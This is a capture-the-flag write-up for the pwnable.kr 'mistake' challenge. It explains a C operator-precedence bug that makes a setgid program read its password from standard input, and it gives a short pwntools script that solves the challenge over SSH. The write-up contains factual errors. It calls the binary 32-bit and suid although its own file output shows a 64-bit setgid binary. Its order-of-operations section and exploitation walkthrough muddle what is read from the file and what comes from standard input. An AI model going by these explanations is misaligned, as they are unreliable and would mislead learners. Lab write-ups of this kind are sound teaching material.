# mistake Writeup

## Challenge infos

```text
We all make mistakes, let's move on.
(don't take this too seriously, no fancy hacking skill is required at all)
This task is based on real event

ssh mistake@pwnable.kr -p2222 (pw:guest)
```

## Server content

```text
--- ls -la ---
total 52
drwxr-x---   5 root mistake      4096 Apr  2 09:08 .
drwxr-xr-x 118 root root         4096 Jun  1 12:05 ..
d---------   2 root root         4096 Jul 29  2014 .bash_history
-r--r-----   1 root mistake_pwn    40 Apr  2 09:08 flag
dr-xr-xr-x   2 root root         4096 Aug 20  2014 .irssi
-r-xr-sr-x   1 root mistake_pwn 16520 Mar 28 14:49 mistake
-rw-r--r--   1 root root          826 Mar 28 14:49 mistake.c
-r--r-----   1 root mistake_pwn    10 Jul 29  2014 password
drwxr-xr-x   2 root root         4096 Oct 23  2016 .pwntools-cache
--- id ---
uid=1017(mistake) gid=1017(mistake) groups=1017(mistake)
--- cat file---
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
        int i;
        for(i=0; i<len; i++){
                s[i] ^= XORKEY;
        }
}

int main(int argc, char* argv[]){

        int fd;
        if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
                printf("can't open password %d\n", fd);
                return 0;
        }

        printf("do not bruteforce...\n");
        sleep(time(0)%20);

        char pw_buf[PW_LEN+1];
        int len;
        if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
                printf("read error\n");
                close(fd);
                return 0;
        }

        char pw_buf2[PW_LEN+1];
        printf("input password : ");
        scanf("%10s", pw_buf2);

        // xor your input
        xor(pw_buf2, 10);

        if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
                printf("Password OK\n");
                setregid(getegid(), getegid());
                system("/bin/cat flag\n");
        }
        else{
                printf("Wrong Password\n");
        }

        close(fd);
        return 0;
}

--- file binary ---
mistake: setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2817ab6c9534e57437b9e0b9de5971e9b526895e, for GNU/Linux 3.2.0, not stripped
```
## Exploitation objective
* The ssh user is ```mistake```, group ```mistake```
* The ```flag``` file is readable only by the user ```mistake_pwn``` or the group ```root```
* The ```mistake``` binary is a 32bit ELF executable by the ```mistake_pwn``` user or members of the ```mistake``` group and is ```suid``` meaning that it executes with the rights of its user even if called by a member of its group

This means that if we pwn the ```mistake``` executable we can gain read access to the ```flag``` file via suid user ```mistake_pwn```.

The ```mistake``` executable is certainly compiled from the ```mistake.c``` source code, let's have a look.

## C code analysis

```c
        int fd;
        if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
                printf("can't open password %d\n", fd);
                return 0;
        }
```
* The program attempts to open a file named `/home/mistake/password` for reading. If it fails to open the file, it exits.
* because there are no parentesis around the `fd=open`, the `fd` variable will always be set to `0` because the `open` function returns a file descriptor (which is always greater than 0 if successful) and the comparison `< 0` will always be false. because false is `0`, the `fd` variable will always be `0` (standard input).

```c
        char pw_buf[PW_LEN+1];
        int len;
        if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
                printf("read error\n");
                close(fd);
                return 0;
        }
```
* The program reads the content of the file into a buffer `pw_buf` of size `PW_LEN + 1` (11 bytes).
* The `read` function reads up to `PW_LEN` bytes from the file descriptor `fd` (which is always `0`, standard input) into `pw_buf`.
* If the read operation fails (returns `0` or less), it prints an error message and exits.

```c
        char pw_buf2[PW_LEN+1];
        printf("input password : ");
        scanf("%10s", pw_buf2);
```
* The program prompts the user to input a password and reads it into another buffer `pw_buf2`, which is also of size `PW_LEN + 1` (11 bytes).
```c
        // xor your input
        xor(pw_buf2, 10);
```
* The program applies an XOR operation to the user input `pw_buf2` with a key defined as `XORKEY` (which is `1`).
* This means that each byte of the input password will be XORed with `1`, effectively flipping the least significant bit of each byte.

```c
        if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
                printf("Password OK\n");
                setregid(getegid(), getegid());
                system("/bin/cat flag\n");
        }
```
* The program compares the original password read from the file (`pw_buf`) with the user input after XORing (`pw_buf2`).
* If they match, it prints "Password OK", changes the group ID to the effective group ID (which is `mistake_pwn`), and executes the command `/bin/cat flag`, which will display the content of the `flag` file.

## C order of operations
* The `if` statement in the `open` function is evaluated first, then compared to `0`, and then assigned to `fd`.
* so ```fd=0``` which means that the program will always read from standard input instead of the file `/home/mistake/password`.

## Exploitation
* First we will send the password bbbbbbbbbb (`10` bytes) to the program, which will read it from standard input because of the bug in the `open` function.
* The program will then XOR the input with `1`, resulting in `cccccccccc` (`10` bytes).
* The program will then compare the XORed input with the original password read from the file, which is also `cccccccccc` (`10` bytes) because the file contains the string `bbbbbbbbbb` (`10` bytes) XORed with `1`.
* If the comparison is successful, the program will execute `/bin/cat flag`, which will display the content of the `flag` file.

## python script

```python
#!/usr/bin/env python
from pwn import *
```
* Use [pwntools](https://github.com/Gallopsled/pwntools) for automatic exploitation
```python
server = ssh('mistake', 'pwnable.kr', 2222, 'guest')
io = server.process('./mistake')

io.sendline('b' * 10)
io.sendline('c' * 10)
```
* Use `ssh` to connect to the remote server with the user `mistake` and password `guest`
* Start the `mistake` process
* Send the string `bbbbbbbbbb` (`10` bytes) to the process as the password
* Send the string `cccccccccc` (`10` bytes) to the process as the XORed password
```python
result = io.recvall()

io.close()
server.close()

print(result)
```
* Receive all output from the process and print it